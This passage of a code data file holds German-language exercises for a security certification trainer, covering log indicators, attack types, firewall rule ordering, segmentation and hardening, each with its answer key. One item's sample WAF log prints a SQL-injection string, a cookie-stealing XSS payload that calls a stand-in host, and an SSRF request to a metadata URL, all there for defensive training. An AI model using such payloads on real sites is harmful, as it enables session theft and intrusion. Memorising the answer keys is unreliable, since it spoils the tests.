    difficulty: 'einsteiger',
    minutes: 4,
    description:
      'Vier SOC-Hinweise, vier Aktivitaetsmuster. Ordne jedem Hinweis das passendste Indiz zu.',
    evidence:
      'SIEM-Snapshot:\n  A. 900 fehlgeschlagene Logins gegen vpn.example in 5 Minuten\n  B. Host HR-22 sendet alle 60 Sekunden 180 Bytes an 203.0.113.77\n  C. 12 GB ZIP-Archiv nachts zu unbekanntem Cloud-Speicher\n  D. Login aus Berlin und 7 Minuten spaeter aus Singapur',
    interaction: {
      type: 'matching',
      items: [
        { left: 'Viele fehlgeschlagene VPN-Logins', right: 'Brute Force / Password Spraying' },
        { left: 'Kleiner periodischer Outbound-Traffic', right: 'Command-and-Control Beaconing' },
        { left: 'Grosses Archiv zu fremdem Cloud-Speicher', right: 'Data Exfiltration' },
        { left: 'Unmoegliche Reise zwischen Logins', right: 'Impossible Travel / Account Compromise' },
      ],
      options: [
        'Brute Force / Password Spraying',
        'Command-and-Control Beaconing',
        'Data Exfiltration',
        'Impossible Travel / Account Compromise',
      ],
    },
  },
  {
    id: 'bedrohungen-supply-chain-sbom',
    categoryId: 'bedrohungen',
    title: 'Supply-Chain-Fund mit SBOM pruefen',
    objective: '2.2 Threat Vectors and Attack Surfaces',
    difficulty: 'fortgeschritten',
    minutes: 5,
    description:
      'Eine kritische Bibliothek wird oeffentlich verwundbar gemeldet. Bring die SBOM-basierte Reaktion in eine nachvollziehbare Reihenfolge.',
    evidence:
      'Advisory: CVE fuer image-parser-lib < 4.2.8\n  Assets: Webshop, Kundenportal, internes Reporting\n  Vorgabe: erst Exposition und Kritikalitaet klaeren, dann Update planen.',
    interaction: {
      type: 'ordering',
      steps: [
        'Patch im Test validieren und Rollback vorbereiten',
        'Produktiv ausrollen und SBOM/Inventar aktualisieren',
        'Betroffene Deployments ueber SBOM/Dependency-Inventar identifizieren',
        'Fix-Version oder Workaround vom Hersteller/Projekt verifizieren',
        'Versionen, Exposition und Datenkritikalitaet je Anwendung bewerten',
      ],
      correctOrder: [2, 4, 3, 0, 1],
    },
  },
  {
    id: 'bedrohungen-mitigation-mapping',
    categoryId: 'bedrohungen',
    title: 'Mitigation zur Angriffsflaeche',
    objective: '2.5 Mitigation Techniques',
    difficulty: 'einsteiger',
    minutes: 4,
    description:
      'Ordne jeder beobachteten Angriffsflaeche die Massnahme zu, die das Risiko am direktesten senkt.',
    interaction: {
      type: 'matching',
      items: [
        { left: 'Oeffentliche Web-App mit Injection-Risiko', right: 'Input Validation + WAF-Regeln' },
        { left: 'Ungepatchte Drittbibliotheken im Build', right: 'Dependency Scanning + Patch-Management' },
        { left: 'Flaches Netz zwischen Clients und Servern', right: 'Segmentierung + ACLs' },
        { left: 'Gestohlene Zugangsdaten werden wiederverwendet', right: 'Phishing-resistente MFA + Passwortwechsel' },
      ],
      options: [
        'Input Validation + WAF-Regeln',
        'Dependency Scanning + Patch-Management',
        'Segmentierung + ACLs',
        'Phishing-resistente MFA + Passwortwechsel',
      ],
    },
  },

  {
    id: 'bedrohungen-passwort-angriffe',
    categoryId: 'bedrohungen',
    title: 'Passwort-Angriff am Log erkennen',
    objective: '2.4 Indicators of Malicious Activity',
    difficulty: 'fortgeschritten',
    minutes: 4,
    description:
      'Vier Auth-Log-Muster aus einer Nacht. Ordne jedem Muster den Passwort-Angriff zu, der am besten passt.',
    evidence:
      'Auth-Log (aggregiert):\n  A. 40.000 Logins auf viele Accounts, je GENAU 1 Versuch mit Passwort "Winter2026!"\n  B. 1 Account, 90.000 Versuche, Woerterbuch plus Mutationen\n  C. 12.000 Logins mit E-Mail/Passwort-Paaren aus einem fremden Breach-Dump, ~1% Treffer\n  D. NTLM-Hash wird ohne Klartext-Passwort direkt zur Authentisierung wiederverwendet',
    interaction: {
      type: 'matching',
      items: [
        { left: 'A: ein Passwort gegen viele Accounts', right: 'Password Spraying' },
        { left: 'B: viele Versuche gegen einen Account', right: 'Brute Force / Dictionary' },
        { left: 'C: Breach-Paare massenhaft durchprobiert', right: 'Credential Stuffing' },
        { left: 'D: Hash statt Passwort wiederverwendet', right: 'Pass-the-Hash' },
      ],
      options: ['Password Spraying', 'Brute Force / Dictionary', 'Credential Stuffing', 'Pass-the-Hash'],
    },
  },
  {
    id: 'bedrohungen-netzwerk-angriffe',
    categoryId: 'bedrohungen',
    title: 'Netzwerk-Angriff aus dem Befund',
    objective: '2.4 Malicious Activity',
    difficulty: 'fortgeschritten',
    minutes: 4,
    description:
      'Vier Netzwerk-Befunde aus dem NOC. Ordne jedem Befund den Angriffstyp zu, den die Symptome belegen.',
    evidence:
      'Befunde:\n  A. Tausende SYN-Pakete von gespooften Quellen, Backlog voll, Webshop nicht erreichbar\n  B. Clients loesen bank-beispiel.de ploetzlich zu einer fremden IP auf; Resolver-Cache manipuliert\n  C. Im Gaeste-WLAN beantwortet ein fremdes Geraet ARP-Anfragen fuer das Gateway\n  D. Angreifer wiederholt einen mitgeschnittenen, gueltigen Session-Token gegen die API',
    interaction: {
      type: 'matching',
      items: [
        { left: 'A: SYN-Flut von gespooften Quellen', right: 'DDoS / SYN-Flood' },
        { left: 'B: manipulierte Namensaufloesung im Resolver', right: 'DNS-(Cache-)Poisoning' },
        { left: 'C: fremdes Geraet gibt sich als Gateway aus', right: 'On-Path via ARP-Spoofing' },
        { left: 'D: mitgeschnittener Token wiederverwendet', right: 'Replay-Angriff' },
      ],
      options: ['DDoS / SYN-Flood', 'DNS-(Cache-)Poisoning', 'On-Path via ARP-Spoofing', 'Replay-Angriff'],
    },
  },
  {
    id: 'bedrohungen-web-app-angriffe',
    categoryId: 'bedrohungen',
    title: 'Web-Angriff im Request erkennen',
    objective: '2.4 Malicious Activity',
    difficulty: 'experte',
    minutes: 5,
    description:
      'Vier verdaechtige Requests aus dem WAF-Log. Ordne jedem Request die Angriffsklasse zu, die er ausnutzt.',
    evidence:
      'WAF-Log:\n  A. GET /login?user=admin\'--&pass=x\n  B. POST /profil Kommentar: <script>fetch("https://evil.tld/c?d="+document.cookie)</script>\n  C. GET /api/rechnungen/4711 liefert eine fremde Rechnung — ID einfach hochgezaehlt\n  D. GET /export?url=http://169.254.169.254/latest/meta-data/ — abgerufen vom Server selbst',
    interaction: {
      type: 'matching',
      items: [
        { left: 'A: \'-- im Login-Parameter', right: 'SQL-Injection' },
        { left: 'B: Script-Tag im Kommentarfeld', right: 'Cross-Site Scripting (XSS)' },
        { left: 'C: fremde Rechnung per ID-Hochzaehlen', right: 'Broken Access Control / IDOR' },
        { left: 'D: Server ruft interne Metadaten-URL ab', right: 'Server-Side Request Forgery (SSRF)' },
      ],
      options: ['SQL-Injection', 'Cross-Site Scripting (XSS)', 'Broken Access Control / IDOR', 'Server-Side Request Forgery (SSRF)'],
    },
  },

  // ── Firewalls & Netzwerk (Schwerpunkt; Geo-Block BELEGT `…23.39.17.jpeg`) ──
  {
    // (BELEGT: Detail `…23.39.17.jpeg`)
    id: 'firewalls-geo-block',
    categoryId: 'firewalls',
    title: 'Geo-Block vor Web-Allow',
    objective: '3.2 Applying Security Principles',
    difficulty: 'experte',
    minutes: 4,
    description:
      'Nach DDoS-Attacken aus bestimmten Laendern soll ein Geo-Block (z.B. 185.204.0.0/16) Web-Zugriff vor dem regulaeren HTTPS-Allow blockieren. Ordne die Regeln korrekt.',
    topology: 'Internet -> [Firewall] -> DMZ Webserver 192.168.1.10:443',
    goal: 'Ziel: Block bekannter Bad-Networks zuerst, danach Standard-Allow-Web-Zugriff, dann implicit DENY.',
    interaction: {
      type: 'ordering',
      steps: [
        'DENY  ANY  ANY → ANY  :ANY',
        'DENY  ANY  185.204.0.0/16 → ANY  :ANY',
        'ALLOW TCP  ANY → 192.168.1.10  :443',
      ],
      correctOrder: [1, 2, 0],
    },
  },
  {
    id: 'firewalls-implicit-deny',
    categoryId: 'firewalls',
    title: 'Implicit Deny: welche Regel greift?',
    objective: '4.5 Enterprise Security',
    difficulty: 'fortgeschritten',
    minutes: 4,
    description:
      'Gegeben ist das Regelwerk unten (Top-Down, First-Match). Ordne jedem eingehenden Paket die Regel zu, die tatsaechlich greift.',
    evidence:
      'Regelwerk (Top-Down):\n  R1: ALLOW TCP ANY -> 10.0.1.20 :443\n  R2: ALLOW TCP 10.0.2.0/24 -> 10.0.1.30 :22\n  R3: DENY  ANY ANY -> ANY :ANY (implicit)',
    topology: 'Internet -> [Firewall] -> Server-VLAN 10.0.1.0/24 | Admin-VLAN 10.0.2.0/24',
    interaction: {
      type: 'matching',
      items: [
        { left: 'HTTPS aus dem Internet an 10.0.1.20:443', right: 'R1 — erlaubt' },
        { left: 'SSH von 10.0.2.15 an 10.0.1.30:22', right: 'R2 — erlaubt' },
        { left: 'SSH aus dem Internet an 10.0.1.30:22', right: 'R3 — implicit deny' },
        { left: 'RDP von 10.0.2.15 an 10.0.1.20:3389', right: 'R3 — implicit deny' },
      ],
      options: ['R1 — erlaubt', 'R2 — erlaubt', 'R3 — implicit deny'],
    },
  },
  {
    id: 'firewalls-segmentierung',
    categoryId: 'firewalls',
    title: 'Segmentierung: jedes System in seine Zone',
    objective: '3.2 Applying Security Principles',
    difficulty: 'einsteiger',
    minutes: 4,
    description:
      'Beim Redesign wird das flache Netz segmentiert. Ordne jedes System der Zone zu, in die es gehoert.',
    topology: 'Internet -> [FW] -> DMZ | -> Internal | -> Restricted (OT/Sensitive)',
    interaction: {
      type: 'matching',
      items: [
        { left: 'Oeffentlicher Webserver', right: 'DMZ' },
        { left: 'Mitarbeiter-Clients', right: 'Internal' },
        { left: 'SCADA-Steuerung der Produktion', right: 'Restricted (OT)' },
        { left: 'Datenbank mit Kundendaten', right: 'Restricted (Sensitive)' },
      ],
      options: ['DMZ', 'Internal', 'Restricted (OT)', 'Restricted (Sensitive)'],
    },
  },
  {
    id: 'firewalls-egress',
    categoryId: 'firewalls',
    title: 'Egress-Filterung gegen C2-Traffic',
    objective: '4.5 Enterprise Security',
    difficulty: 'experte',
    minutes: 5,
    description:
      'Nach einem Beacon-Fund soll ausgehender Traffic kontrolliert werden: DNS nur noch ueber den internen Resolver, Web nur ueber den Proxy, Rest blockieren. Ordne die Egress-Regeln korrekt (Top-Down, First-Match).',
    topology: 'Clients 10.0.5.0/24 -> [Firewall] -> Internet | Resolver 10.0.1.53 | Proxy 10.0.1.80',
    goal: 'Ziel: Erst die erlaubten Spezialfaelle (Resolver, Proxy), dann direktes DNS/Web verbieten, am Ende implicit DENY.',
    interaction: {
      type: 'ordering',
      steps: [
        'DENY  ANY  10.0.5.0/24 → ANY  :ANY',
        'ALLOW UDP  10.0.5.0/24 → 10.0.1.53  :53',
        'DENY  UDP  10.0.5.0/24 → ANY  :53',
        'ALLOW TCP  10.0.5.0/24 → 10.0.1.80  :8080',
      ],
      correctOrder: [1, 3, 2, 0],
    },
  },
  {
    id: 'firewalls-shadowed-rule',
    categoryId: 'firewalls',
    title: 'Shadowed Rule im Regelwerk finden',
    objective: '4.5 Enterprise Security',
    difficulty: 'fortgeschritten',
    minutes: 4,
    description:
      'Ein Firewall-Review sucht Regeln, die nie greifen koennen. Ordne jedem Paket die tatsaechlich greifende Regel zu und erkenne die verdeckte Regel.',
    evidence:
      'Regelwerk (Top-Down, First-Match):\n  R1: DENY  TCP ANY -> 10.10.20.10 :22\n  R2: ALLOW TCP 203.0.113.10 -> 10.10.20.10 :22\n  R3: ALLOW TCP ANY -> 10.10.20.10 :443\n  R4: DENY  ANY ANY -> ANY :ANY',
    topology: 'Internet -> [Firewall] -> Admin-Jumpbox 10.10.20.10',
    interaction: {
      type: 'matching',
      items: [
        { left: 'SSH von 203.0.113.10 zur Jumpbox', right: 'R1 — deny; R2 ist shadowed' },
        { left: 'HTTPS von 198.51.100.8 zur Jumpbox', right: 'R3 — allow' },
        { left: 'RDP von 203.0.113.10 zur Jumpbox', right: 'R4 — deny' },
        { left: 'Welche Regel muss vor R1 stehen, wenn der Admin-Host SSH darf?', right: 'R2 — spezifische Allow-Regel' },
      ],
      options: ['R1 — deny; R2 ist shadowed', 'R3 — allow', 'R4 — deny', 'R2 — spezifische Allow-Regel'],
    },
  },
  {
    id: 'firewalls-east-west-microseg',
    categoryId: 'firewalls',
    title: 'East-West-Traffic mikrosegmentieren',
    objective: '3.2 Applying Security Principles',
    difficulty: 'experte',
    minutes: 5,
    description:
      'Ein kompromittierter Webserver darf sich nicht lateral ausbreiten. Ordne die internen Firewall-Regeln so, dass nur benoetigte East-West-Flows erlaubt bleiben.',
    topology: 'DMZ Web 10.20.10.0/24 -> App 10.20.20.0/24 -> DB 10.20.30.0/24 -> Backup 10.20.40.10',
    goal: 'Ziel: Explizite App-Flows erlauben, direkte Web-zu-DB- und Client-zu-DB-Pfade blocken, Rest deny.',
    interaction: {
      type: 'ordering',
      steps: [
        'DENY  ANY  ANY -> ANY :ANY',
        'ALLOW TCP App 10.20.20.0/24 -> DB 10.20.30.20 :5432',
        'DENY  TCP Web 10.20.10.0/24 -> DB 10.20.30.0/24 :ANY',
        'ALLOW TCP Web 10.20.10.0/24 -> App 10.20.20.15 :8443',
        'ALLOW TCP Backup 10.20.40.10 -> DB 10.20.30.20 :5432',
      ],
      correctOrder: [3, 1, 4, 2, 0],
    },
  },
  {
    id: 'firewalls-nat-publishing',
    categoryId: 'firewalls',
    title: 'DNAT, SNAT oder PAT?',
    objective: '4.5 Enterprise Security',
    difficulty: 'einsteiger',
    minutes: 4,
    description:
      'Vier Uebersetzungsfaelle aus dem Firewall-Ticket. Ordne jeden Fall dem passenden NAT-Typ zu.',
    evidence:
      'Ticket FW-219:\n  - Webshop soll unter 198.51.100.20:443 erreichbar sein\n  - Clients nutzen eine gemeinsame Public-IP fuer Internetzugriff\n  - Partnernetz darf nur als 10.200.0.0/24 sichtbar sein\n  - Zwei interne Webserver teilen sich dieselbe Public-IP auf unterschiedlichen Ports',
    interaction: {
      type: 'matching',
      items: [
        { left: 'Public 198.51.100.20:443 -> intern 10.0.10.20:443', right: 'DNAT / Port Forwarding' },
        { left: 'Viele Clients -> eine Public-IP mit Port-Uebersetzung', right: 'PAT / NAT Overload' },
        { left: 'Internes Partnernetz wird auf 10.200.0.0/24 umgeschrieben', right: 'SNAT' },
        { left: 'Public-IP teilt Ports 8443 und 9443 auf zwei Server', right: 'PAT / Port Mapping' },
      ],
      options: ['DNAT / Port Forwarding', 'PAT / NAT Overload', 'SNAT', 'PAT / Port Mapping'],
    },
  },
  {
    id: 'firewalls-waf-actions',
    categoryId: 'firewalls',
    title: 'WAF-Aktion zur Web-Anfrage',
    objective: '4.5 Enterprise Security',
    difficulty: 'fortgeschritten',
    minutes: 4,
    description:
      'Die WAF soll nicht jeden auffaelligen Request gleich blocken. Ordne jeder Beobachtung die verhaeltnismaessige Aktion zu.',
    evidence:
      'Requests:\n  A. SQLi-Payload gegen /login\n  B. Verdacht auf Bot, aber legitime User-Agent-Kette\n  C. Security-Scanner aus internem CIDR waehrend Wartungsfenster\n  D. Normaler Request, nur Log-Korrelation fuer neue Regel benoetigt',
    interaction: {
      type: 'matching',
      items: [
        { left: 'A: klare SQLi-Payload', right: 'Block' },
        { left: 'B: Bot-Verdacht mit Unsicherheit', right: 'Managed Challenge' },
        { left: 'C: interner Scanner im Wartungsfenster', right: 'Skip / Allowlist fuer definierte Controls' },
        { left: 'D: neue Regel erst beobachten', right: 'Log' },
      ],
      options: ['Block', 'Managed Challenge', 'Skip / Allowlist fuer definierte Controls', 'Log'],
    },
  },
  {
    id: 'firewalls-admin-access',
    categoryId: 'firewalls',
    title: 'Firewall-Adminzugriff haerten',
    objective: '4.5 Enterprise Security',
    difficulty: 'fortgeschritten',
    minutes: 5,
    description:
      'Eine Appliance ist mit Management-Interface aus mehreren Netzen erreichbar. Bring die Haertungs-Schritte in eine sichere Reihenfolge.',
    evidence:
      'Ist-Zustand:\n  - HTTPS-Admin-GUI auf WAN und LAN offen\n  - Lokaler Admin ohne MFA\n  - SNMPv2 community public\n  - Syslog nicht zentralisiert',
    interaction: {
      type: 'ordering',
      steps: [
        'Management-Zugriff auf dediziertes Admin-Netz/VPN begrenzen',
        'SNMPv2/public deaktivieren, SNMPv3 oder Telemetrie mit Auth nutzen',
        'Break-glass-Konto dokumentieren und sicher verwahren',
        'MFA/RBAC fuer Admins aktivieren',
        'Zentrale Logs/Config-Backups einschalten und Zugriff auditieren',
      ],
      correctOrder: [0, 3, 2, 1, 4],
    },
  },
  {
    id: 'firewalls-vpn-split-tunnel',
    categoryId: 'firewalls',
    title: 'Split-Tunnel-Regeln pruefen',
    objective: '4.5 Enterprise Security',
    difficulty: 'fortgeschritten',
    minutes: 4,
    description:
      'Remote-User sollen SaaS direkt, interne Apps aber nur ueber VPN erreichen. Ordne die Flows der passenden Policy zu.',
    topology: 'Laptop -> VPN Gateway -> Internal Apps | Laptop -> Internet/SaaS',
    interaction: {
      type: 'matching',
      items: [
        { left: 'ERP 10.50.20.10:443', right: 'Full Tunnel ueber VPN / erlauben' },
        { left: 'Privates RFC1918-Ziel 10.60.0.0/16', right: 'Ueber VPN routen und per ACL pruefen' },
        { left: 'SaaS example-crm.com:443', right: 'Split direkt ins Internet erlauben' },
        { left: 'Unbekanntes RDP-Ziel im Internet', right: 'Blocken' },
      ],
      options: [
        'Full Tunnel ueber VPN / erlauben',
        'Ueber VPN routen und per ACL pruefen',
        'Split direkt ins Internet erlauben',
        'Blocken',
      ],
    },
  },
  {
    id: 'firewalls-log-triage',
    categoryId: 'firewalls',
    title: 'Firewall-Log: Ursache finden',
    objective: '4.9 Security Data Sources',
    difficulty: 'einsteiger',
    minutes: 4,
    description:
      'Vier Firewall-Logzeilen wurden eskaliert. Ordne jede Zeile der wahrscheinlichsten Ursache zu.',
    evidence:
      'Logauszug:\n  09:12 deny tcp 10.0.5.44:51512 -> 10.0.1.10:22 rule=implicit\n  09:13 deny udp 10.0.5.44:53012 -> 8.8.8.8:53 rule=NoDirectDNS\n  09:14 allow tcp 10.0.5.44:52002 -> 10.0.1.80:8080 rule=ProxyOnly\n  09:15 deny tcp 198.51.100.4:443 -> 10.0.1.20:443 flags=RST',
    interaction: {
      type: 'matching',
      items: [
        { left: 'SSH zum Server geblockt', right: 'Kein expliziter Allow, implicit deny greift' },
        { left: 'Direktes DNS zu 8.8.8.8 geblockt', right: 'DNS muss ueber internen Resolver' },
        { left: 'Web ueber 10.0.1.80:8080 erlaubt', right: 'Proxy-Pfad korrekt' },
        { left: 'RST von extern auf Webserver', right: 'Verbindungsabbruch/Session-Problem untersuchen' },
      ],
      options: [
        'Kein expliziter Allow, implicit deny greift',
        'DNS muss ueber internen Resolver',
        'Proxy-Pfad korrekt',
        'Verbindungsabbruch/Session-Problem untersuchen',
      ],
    },
  },
  {
    id: 'firewalls-zero-trust-pep',
    categoryId: 'firewalls',
    title: 'ZTNA-Gateway als PEP',
    objective: '1.2 Security Concepts',
    difficulty: 'experte',
    minutes: 5,
    description:
      'Ein ZTNA-Rollout ersetzt pauschales Netz-VPN. Ordne die Schritte der Zugriffsentscheidung den richtigen Komponenten zu.',
    topology: 'User/Device -> ZTNA Client -> Policy Enforcement Point -> App | Control Plane: Policy Engine + Administrator',
    interaction: {
      type: 'matching',
      items: [
        { left: 'Prueft User-, Device- und Kontextsignale gegen Policy', right: 'Policy Engine' },
        { left: 'Erzeugt kurzlebige Session/Connector-Konfiguration', right: 'Policy Administrator' },
        { left: 'Laesst nur die genehmigte App-Verbindung durch', right: 'Policy Enforcement Point' },
        { left: 'Liefert Device-Health und Identitaetsdaten', right: 'Policy Information / Telemetry' },
      ],
      options: ['Policy Engine', 'Policy Administrator', 'Policy Enforcement Point', 'Policy Information / Telemetry'],
    },
  },

  {
    id: 'firewalls-ids-ips-platzierung',
    categoryId: 'firewalls',
    title: 'IDS oder IPS — Sensor richtig setzen',
    objective: '4.5 Enterprise Security',
    difficulty: 'fortgeschritten',
    minutes: 4,
    description:
      'Vier Anforderungen aus dem Netzwerk-Redesign. Ordne jeder Anforderung den passenden Sensor-Modus bzw. die Platzierung zu.',
    topology: 'Internet -> [FW] -> (a) Inline-Sensor -> Core-Switch -(SPAN/TAP)-> (b) passiver Sensor | Host: (c) Agent',
    interaction: {
      type: 'matching',
      items: [
        { left: 'Bekannte Exploits sollen aktiv geblockt werden', right: 'IPS inline hinter der Firewall' },
        { left: 'Nur beobachten, kein Risiko fuer den Traffic-Fluss', right: 'IDS passiv am SPAN/TAP' },
        { left: 'Prozess- und Dateiverhalten auf dem Server selbst', right: 'Host-basiertes IDS / EDR-Agent' },
        { left: 'Unbekannte Abweichungen vom Normalverkehr melden', right: 'Anomalie-/Baseline-Erkennung' },
      ],
      options: ['IPS inline hinter der Firewall', 'IDS passiv am SPAN/TAP', 'Host-basiertes IDS / EDR-Agent', 'Anomalie-/Baseline-Erkennung'],
    },
  },
  {
    id: 'firewalls-nac-8021x',
    categoryId: 'firewalls',
    title: '802.1X/NAC: Port-Zutritt im Ablauf',
    objective: '4.5 Enterprise Security',
    difficulty: 'experte',
    minutes: 5,
    description:
      'Am Access-Switch wird 802.1X mit NAC-Posture-Check eingefuehrt. Bring den Ablauf vom Einstecken des Kabels bis zum produktiven Zugriff in die richtige Reihenfolge.',
    topology: 'Client (Supplicant) -> Access-Switch (Authenticator) -> RADIUS (Authentication Server) -> NAC/Policy',
    goal: 'Ziel: Erst authentisieren, dann Health pruefen, erst danach ins Ziel-VLAN — nicht umgekehrt.',
    interaction: {
      type: 'ordering',
      steps: [
        'Switch weist das Geraet dem Ziel-VLAN zu, produktiver Zugriff beginnt',
        'Client steckt ein; Port ist unauthenticated und laesst nur EAPOL durch',
        'NAC prueft die Posture (Patchstand, EDR aktiv); bei Fail: Quarantaene-VLAN',
        'RADIUS prueft die Identitaet (Zertifikat/Credentials) via EAP',
        'Supplicant sendet seine Identitaet als Antwort auf den EAP-Request',
      ],
      correctOrder: [1, 4, 3, 2, 0],
    },
  },

  // ── Sichere Architektur (⚠️ neu generiert) ────────────────────────────────
  {
    id: 'architektur-cloud-modelle',
    categoryId: 'architektur',
    title: 'Cloud-Modell zum Anwendungsfall',
    objective: '3.1 Architecture Models',
    difficulty: 'einsteiger',
    minutes: 4,
    description:
      'Vier Projekt-Anforderungen, vier Betriebsmodelle. Ordne jedem Anforderungsprofil das passende Modell zu.',
    interaction: {
      type: 'matching',
      items: [
        { left: 'Volle Kontrolle ueber Hardware und Daten, Latenz minimal', right: 'On-Premises' },
        { left: 'VMs nach Bedarf, OS-Kontrolle bleibt im Haus', right: 'IaaS' },
        { left: 'Entwickler wollen nur deployen, kein OS-Management', right: 'PaaS' },
        { left: 'Fertige CRM-Loesung, sofort nutzbar', right: 'SaaS' },
      ],
      options: ['On-Premises', 'IaaS', 'PaaS', 'SaaS'],
    },
  },
  {
    id: 'architektur-datenzustaende',
    categoryId: 'architektur',
    title: 'Datenzustand und passender Schutz',
    objective: '3.3 Data Protection',
    difficulty: 'einsteiger',
    minutes: 3,
    description:
      'Ordne jedem Datenzustand die primaere Schutzmassnahme zu.',
    interaction: {
      type: 'matching',
      items: [
        { left: 'Data at Rest (Datenbank-Files)', right: 'Festplatten-/Volume-Verschluesselung' },
        { left: 'Data in Transit (API-Calls)', right: 'TLS 1.3' },
        { left: 'Data in Use (RAM-Verarbeitung)', right: 'Secure Enclave / Memory Encryption' },
      ],
      options: ['Festplatten-/Volume-Verschluesselung', 'TLS 1.3', 'Secure Enclave / Memory Encryption'],
    },
  },
  {
    id: 'architektur-resilienz',
    categoryId: 'architektur',
    title: 'Resilienz: RTO, RPO & Co. zuordnen',
    objective: '3.4 Resilience & Recovery',
    difficulty: 'fortgeschritten',
    minutes: 5,
    description:
      'Nach dem BIA-Workshop sollen die Kennzahlen sauber belegt werden. Ordne jede Aussage der richtigen Kennzahl zu.',
    evidence:
      'BIA-Auszug Webshop:\n  - Maximal 2h Ausfall tolerierbar\n  - Maximal 15min Datenverlust tolerierbar\n  - Festplatten fallen im Schnitt alle 4 Jahre aus\n  - Wiederanlauf dauert im Schnitt 45min',
    interaction: {
      type: 'matching',
      items: [
        { left: 'Maximal tolerierte Ausfallzeit (2h)', right: 'RTO' },
        { left: 'Maximal tolerierter Datenverlust (15min)', right: 'RPO' },
        { left: 'Mittlere Zeit zwischen Ausfaellen (4 Jahre)', right: 'MTBF' },
        { left: 'Mittlere Wiederanlaufzeit (45min)', right: 'MTTR' },
      ],
      options: ['RTO', 'RPO', 'MTBF', 'MTTR'],
    },
  },
  {
    id: 'architektur-backup-321',
    categoryId: 'architektur',
    title: '3-2-1-Backup richtig aufbauen',
    objective: '3.4 Resilience & Recovery',
    difficulty: 'fortgeschritten',
    minutes: 4,
    description:
      'Die neue Backup-Strategie soll der 3-2-1-Regel folgen und gegen Ransomware bestehen. Bring die Schritte des Restore-Tests in die richtige Reihenfolge.',
    goal: 'Ziel: 3 Kopien, 2 Medientypen, 1 Kopie offsite/offline — und der Restore ist regelmaessig geprobt.',
    interaction: {
      type: 'ordering',
      steps: [
        'Integritaet der Backup-Kopie pruefen (Hash-Abgleich)',
        'Restore in isolierte Test-Umgebung einspielen',
        'Offline-/Offsite-Kopie identifizieren und holen',
        'Anwendung starten und Stichproben validieren',
        'Testergebnis dokumentieren und Luecken nacharbeiten',
      ],
      correctOrder: [2, 0, 1, 3, 4],
    },
  },
  {
    id: 'architektur-shared-responsibility-matrix',
    categoryId: 'architektur',
    title: 'Cloud-Verantwortung sauber trennen',
    objective: '3.1 Architecture Models',
    difficulty: 'fortgeschritten',
    minutes: 4,
    description:
      'Ein Audit fragt, wer welche Sicherheitsaufgabe in IaaS/PaaS/SaaS traegt. Ordne die Verantwortung richtig zu.',
    evidence:
      'Cloud-Services:\n  A. IaaS-VM mit eigener Anwendung\n  B. PaaS-Datenbankdienst\n  C. SaaS-Ticket-System\n  D. Physische Rechenzentrums-Sicherheit des Providers',
    interaction: {
      type: 'matching',
      items: [
        { left: 'A: Gast-OS patchen und konfigurieren', right: 'Kunde (Security in the Cloud)' },
        { left: 'B: Datenklassifizierung und Zugriff auf Tabellen', right: 'Kunde (Daten/IAM)' },
        { left: 'C: SaaS-Benutzer, Rollen und Datenfreigaben', right: 'Kunde (Konfiguration)' },
        { left: 'D: Hardware, Facility, Hypervisor-Basis', right: 'Cloud Provider (Security of the Cloud)' },
      ],
      options: [
        'Kunde (Security in the Cloud)',
        'Kunde (Daten/IAM)',
        'Kunde (Konfiguration)',
        'Cloud Provider (Security of the Cloud)',
      ],
    },
  },
  {
    id: 'architektur-ha-failover',
    categoryId: 'architektur',
    title: 'HA-Failover ohne Datenverlust',
    objective: '3.4 Resiliency and Recovery',
    difficulty: 'experte',
    minutes: 5,
    description:
      'Der Webshop muss in eine zweite Zone ausweichen. Bring die Failover-Schritte so in Reihenfolge, dass Datenkonsistenz und Verfuegbarkeit geprueft werden.',
    evidence:
      'BIA: RTO 30 Minuten, RPO 5 Minuten\n  Architektur: Active/Passive DB-Replikat, Load Balancer Health Checks, IaC fuer App-Knoten',
    interaction: {
      type: 'ordering',
      steps: [
        'DNS/Load-Balancer-Traffic auf die gesunde Zone umschalten',
        'Sekundaeres DB-Replikat auf Replikationsstand/RPO pruefen',
        'App-Knoten per IaC in Zone B hochfahren oder skalieren',
        'Transaktions- und Login-Stichproben gegen Zone B validieren',
        'Primar-Zone isolieren, damit kein Split-Brain entsteht',
        'Post-Failover-Monitoring und Incident-Timeline dokumentieren',
      ],
      correctOrder: [4, 1, 2, 0, 3, 5],
    },
  },
  {
    id: 'architektur-data-sanitization',
    categoryId: 'architektur',
    title: 'Datentraeger richtig sanitisieren',
    objective: '3.3 Protecting Data',
    difficulty: 'fortgeschritten',
    minutes: 4,
    description:
      'Vier Medien verlassen den Schutzbereich. Ordne die angemessene Sanitization-Entscheidung zu.',
    evidence:
      'Asset-Entsorgung:\n  1. SSD aus Standard-Notebook, Wiederverwendung intern\n  2. Verschluesselte SSD mit verlorenem Key, Entsorgung extern\n  3. Defekte HDD mit Gesundheitsdaten, keine sichere Loeschung moeglich\n  4. Leerer USB-Stick aus Schulungsraum, keine sensiblen Daten',
    interaction: {
      type: 'matching',
      items: [
        { left: 'SSD intern wiederverwenden', right: 'Clear/Purge passend zur Medienart + Verifikation' },
        { left: 'Verschluesselte SSD, Key sicher vernichten', right: 'Crypto Erase' },
        { left: 'Defekte HDD mit Gesundheitsdaten', right: 'Destroy' },
        { left: 'USB-Stick ohne sensible Daten', right: 'Clear oder normale Wiederbereitstellung nach Policy' },
      ],
      options: [
        'Clear/Purge passend zur Medienart + Verifikation',
        'Crypto Erase',
        'Destroy',
        'Clear oder normale Wiederbereitstellung nach Policy',
      ],
    },
  },
  {
    id: 'architektur-container-hardening',
    categoryId: 'architektur',
    title: 'Container-Workload haerten',
    objective: '3.2 Applying Security Principles',
    difficulty: 'fortgeschritten',
    minutes: 5,
    description:
      'Ein Container wird produktiv gesetzt. Ordne jeden Befund der passenden Haertungsmassnahme zu.',
    evidence:
      'Kubernetes-Review:\n  A. Image basiert auf veraltetem Full-OS-Image\n  B. Container laeuft als root\n  C. Secret liegt als Klartext-Env-Var im Deployment\n  D. Pod darf beliebig ins Internet',
    interaction: {
      type: 'matching',
      items: [
        { left: 'A: veraltetes Full-OS-Image', right: 'Minimal Base Image + Image Scanning' },
        { left: 'B: root im Container', right: 'Non-root User + Least Privilege' },
        { left: 'C: Secret als Klartext-Env', right: 'Secret Manager / Kubernetes Secret mit Zugriffskontrolle' },
        { left: 'D: beliebiger Egress', right: 'Network Policy / Egress ACL' },
      ],
      options: [
        'Minimal Base Image + Image Scanning',
        'Non-root User + Least Privilege',
        'Secret Manager / Kubernetes Secret mit Zugriffskontrolle',
        'Network Policy / Egress ACL',
      ],
    },
  },

  {
    id: 'architektur-ot-ics-iot',
